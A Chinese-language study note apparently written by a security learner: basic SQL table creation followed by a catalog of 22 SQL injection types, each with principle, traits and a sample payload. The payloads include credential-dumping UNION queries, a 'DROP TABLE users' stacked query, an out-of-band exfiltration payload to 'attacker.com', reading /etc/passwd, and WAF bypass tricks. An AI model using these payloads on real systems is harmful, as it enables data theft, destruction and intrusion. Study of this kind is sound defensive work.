# 1.创建一个名为study的数据库的语句

```plaintext
CREATE DATABASE study;
```

# 2.在study库里创建一个user表

> 包含三列:id(整数) name(长度为100的字符串) sex(长度为1的字符串)

```plaintext
USE study;

CREATE TABLE user (
    id INT,
    name VARCHAR(100),
    sex CHAR(1)
);
```

**注： VARCHAR适用于可变长度字符串，根据实际输入内容占用空间  
CHAR适用于固定长度字符串**

**内联注释写法：**

```plaintext

```

相当于：SELECT 1+1  
**安全方面作用**

```plaintext
开发时：可以在 SQL 中嵌入提示或者备注。
• 安全角度：攻击者可能利用 内联注释绕过 WAF 或过滤规则（比如注入 payload 中插入 /**/ 使关键字分割开，从而绕过关键字拦截）。
例：
SELECT * FROM user WHERE name='admin'/**/AND/**/password='123';
```

# 定义：

SQL注入（SQL Injection, 简称SQLi）是指攻击者通过在输入点（如URL参数、表单、Cookie等）中注入恶意SQL代码，使后端数据库执行非预期的语句，从而获取、修改、删除数据库中的数据，甚至控制服务器。

# 发生原因：

1. 输入未经过滤或过滤不严（例如直接拼接到SQL语句里）。
    
2. 程序未使用安全的数据库交互方式（如字符串拼接代替预编译）。
    
3. 错误回显过多，将数据库结构或报错信息直接反馈给攻击者。
    

# 本质：

SQL注入发生在 应用层（拼接SQL语句时） 和 数据库层（执行语句时） 之间，输入没有与SQL指令隔离，导致用户输入能改变SQL逻辑。  

# 注入类型总结表

|     |                            |                               |                  |                                                                           |
| --- | -------------------------- | ----------------------------- | ---------------- | ------------------------------------------------------------------------- |
| 序号  | 名称                         | 原理                            | 特征               | 示例                                                                        |
| 1   | 联合查询注入 (Union-based)       | 通过 `UNION SELECT` 拼接查询结果      | 需要回显 & 字段数对齐     | `id=1 UNION SELECT username,password FROM users`                          |
| 2   | 报错注入 (Error-based)         | 利用报错信息带出数据                    | 应用必须显示 SQL 错误    | `id=1 AND updatexml(1,concat(0x7e,(select database())),1)`                |
| 3   | 布尔盲注 (Boolean-based Blind) | 条件真假 → 页面差异                   | 有显示差异            | `id=1' AND substr(database(),1,1)='t' --+`                                |
| 4   | 时间盲注 (Time-based Blind)    | 通过延时函数推断真假                    | 无差异，靠响应时间        | `id=1' AND IF(substr(user(),1,1)='r',sleep(5),0)--+`                      |
| 5   | 堆叠注入 (Stacked Queries)     | 一次执行多条语句                      | DB 必须支持多语句       | `id=1; DROP TABLE users;--`                                               |
| 6   | 二次注入 (Second-order)        | 恶意数据先存储，后续拼接触发                | 攻击链两步：存储+利用      | 注册：`admin'--`；登录时触发                                                       |
| 7   | 带外注入 (Out-of-Band)         | 通过 DNS/HTTP 外部通道带出数据          | 无回显/盲注时可用        | `id=1 AND load_file(concat('\\\\',(select user()),'.attacker.com\\abc'))` |
| 8   | 宽字节注入                      | 利用多字节编码绕过转义                   | 仅特定编码 (GBK)      | `%df'` 绕过 `addslashes()`                                                  |
| 9   | 文件读写注入                     | 利用 DB 函数读写文件                  | 需 FILE 权限        | `UNION SELECT load_file('/etc/passwd')`                                   |
| 10  | 存储过程注入                     | 存储过程调用拼接 SQL                  | 常见于 MSSQL/Oracle | `exec('SELECT * FROM users WHERE id='+@id)`                               |
| 11  | JSON 注入                    | JSON 参数直接拼接进 SQL              | 常见于 REST API     | `{"id":"1 OR 1=1"}`                                                       |
| 12  | ORM 注入                     | ORM 框架拼接不当                    | 出现在框架层           | `User.query.filter("id=1 or 1=1")`                                        |
| 13  | Header 注入                  | User-Agent / Referer 等拼接进 SQL | 注入点在请求头          | `User-Agent: ' OR '1'='1`                                                 |
| 14  | Cookie 注入                  | Cookie 值拼接进 SQL               | 参数在 Cookie       | `Cookie: id=1' OR '1'='1`                                                 |
| 15  | 搜索/模糊查询注入                  | `LIKE '%xxx%'` 拼接未过滤          | 搜索功能             | `keyword=%' OR '1'='1`                                                    |
| 16  | 函数注入                       | 利用函数输出/报错带数据                  | 依赖 DB 特性         | `id=1 AND extractvalue(1,concat(0x7e,(SELECT user())))`                   |
| 17  | 系统表注入                      | 查询系统表获取结构信息                   | 各 DB 不同          | `SELECT table_name FROM information_schema.tables;`                       |
| 18  | 客户端注入                      | 前端拼接 SQL 被篡改                  | 极少见，危害大          | JS: `sql="SELECT * FROM users WHERE id="+userInput;`                      |
| 19  | 二进制注入 (BLOB)               | 文件/BLOB 字段拼接触发                | 出现在文件上传场景        | `INSERT INTO files(name,data) VALUES('abc' OR 1=1, <binary>)`             |
| 20  | 越权注入                       | 修改条件获取越权数据                    | 用于水平/垂直越权        | `id=1 OR role='admin'`                                                    |
| 21  | GET 参数注入                   | GET 参数拼接 SQL                  | 参数在 URL          | `http://xx.com/item.php?id=1' OR '1'='1`                                  |
| 22  | POST 参数注入                  | POST 表单参数拼接 SQL               | 参数在请求体           | `username=admin'--&password=123`                                          |

# 1.联合查询注入(Union-based)

**原理**：通过 UNION SELECT 拼接多条查询，把攻击者构造的数据一起显示出来。  
**特征**：必须有回显位，且可以对齐字段数。  
**示例**：id=1 UNION SELECT username,password FROM users

# 2.报错注入 (Error-based)

**原理**：利用数据库函数出错时的报错信息，将敏感数据嵌入错误提示中。  
**特征**：应用必须显示 SQL 错误。  
**示例**：id=1 AND updatexml(1,concat(0x7e,(select database())),1)

# 3.布尔盲注 (Boolean-based Blind)

**原理**：通过布尔条件真假，观察页面差异逐字符爆破数据。  
**特征**：页面有差异（显示结果 vs 空白）。  
**示例**：id=1' AND substr(database(),1,1)='t' --+

# 4.时间盲注 (Time-based Blind)

**原理**：通过 sleep() 或 benchmark() 等函数延时，推断条件真假。  
**特征**：页面无差异，依靠响应时间判断。  
**示例**：id=1' AND IF(substr(user(),1,1)='r',sleep(5),0)--+

# 5.堆叠注入 (Stacked Queries)

**原理**：一次执行多条语句，利用 ; 分隔。  
**特征**：依赖数据库是否允许多语句（MSSQL/PGSQL 支持，MySQL 默认不支持）。  
**示例**：id=1; DROP TABLE users;--

# 6.二次注入 (Second-order)

**原理**：恶意数据第一次写入数据库时未触发，但在后续 SQL 查询拼接时触发。  
**特征**：攻击链分两步（存储 + 再利用）。  
**示例**:1.注册用户名：admin'--  
2.登录时拼接语句触发：SELECT * FROM users WHERE name='admin'--' AND pwd='xxx'

# 7.带外注入 (Out-of-band)

**原理**：当无法直接回显/盲注时，通过 DNS/HTTP 等外部通道带出数据。  
**特征**：需要外部可控服务器接收请求。  
**示例**：id=1 AND load_file(concat('\\',(select user()),'.attacker.com\abc'))

# 8.宽字节注入

**原理**：利用多字节编码（如 GBK），让转义符被截断，导致逃逸 '。  
**特征**：仅在特定编码下存在。  
**示例**：输入 %df' 绕过 addslashes()。

# 9.文件读写注入

**原理**：利用数据库函数读写系统文件，甚至 getshell。  
**特征**：需要数据库账户具有 FILE 权限。  
**示例**：UNION SELECT load_file('/etc/passwd')

# 10.存储过程注入

**原理**：存储过程调用拼接 SQL 时未做校验。  
**特征**：常见于 MSSQL / Oracle。  
**示例**：exec('SELECT * FROM users WHERE id='+@id)

# 11.JSON 注入

**原理**：接口直接将 JSON 参数拼接到 SQL。  
**特征**：常见于 RESTful API。  
**示例**：{"id":"1 OR 1=1"}

# 12. ORM 注入

**原理**：ORM 框架（Hibernate、SQLAlchemy 等）在不安全拼接时被利用。  
**特征**：和 SQL 相似，但出现在高级封装层。  
**示例**：User.query.filter("id=1 or 1=1")

# 13.Header 注入

**原理**：某些应用把 User-Agent、Referer、Cookie 等头写入数据库，未做过滤。  
**特征**：注入点不在 URL 参数，而在请求头。  
**示例**：User-Agent: ' OR '1'='1

# 14.Cookie 注入

**原理**：应用直接把 Cookie 值拼接进 SQL。  
**特征**：注入点在 Cookie 而不是 URL。  
**示例**：Cookie: id=1' OR '1'='1

# 15.搜索/模糊查询注入

**原理**：应用在搜索框里用 LIKE '%xxx%' 拼接时未过滤。  
**特征**：出现在搜索框或模糊匹配功能中。  
**示例**：keyword=%' OR '1'='1

# 16.函数注入

**原理**：利用数据库内置函数在报错/回显时泄露数据。  
**特征**：依赖数据库支持的特殊函数。  
**示例（MySQL）**：id=1 AND extractvalue(1,concat(0x7e,(SELECT user())))

# 17.系统表注入

**原理**：利用数据库自带的系统表，枚举数据库、表、字段信息。  
**特征**：不同数据库有不同的系统表。  
**示例** ：MySQL: `SELECT table_name FROM information_schema.tables;`  
MSSQL: `SELECT name FROM sysobjects WHERE xtype='U';`  
Oracle: `SELECT table_name FROM dba_tables;`

# 18.客户端注入

**原理**：应用在前端拼接 SQL（比如直接用 JS 发送 SQL），被攻击者篡改。  
**特征**：很少见，但一旦存在就是致命漏洞。  
**示例**：sql = "SELECT * FROM users WHERE id=" + userInput;

# 19.二进制注入 (BLOB 注入)

**原理**：通过文件上传 / 二进制字段存储，拼接时触发 SQL 注入。  
**特征**：常见于存储 BLOB、文件描述信息。  
**示例**：INSERT INTO files(name,data) VALUES('abc' OR 1=1, )

# 20.越权注入

**原理**：利用注入修改查询条件，实现数据越权访问。  
**特征**：能读取/修改不属于自己的数据。  
**示例**：id=1 OR role='admin'

# 21.GET参数注入

**原理**：应用直接将 URL 查询字符串的参数拼接进 SQL。  
**特征**：最常见的注入点，参数在地址栏里可见。  
**示例**：[http://example.com/item.php?id=1](http://example.com/item.php?id=1)' OR '1'='1

# 22.POST参数注入

**原理**：应用在处理表单提交时，将 POST 参数拼接进 SQL。  
**特征**：参数在请求体中，地址栏不可见，常见于登录、注册表单。  
**示例**：POST /login.php  
username=admin'--&password=123
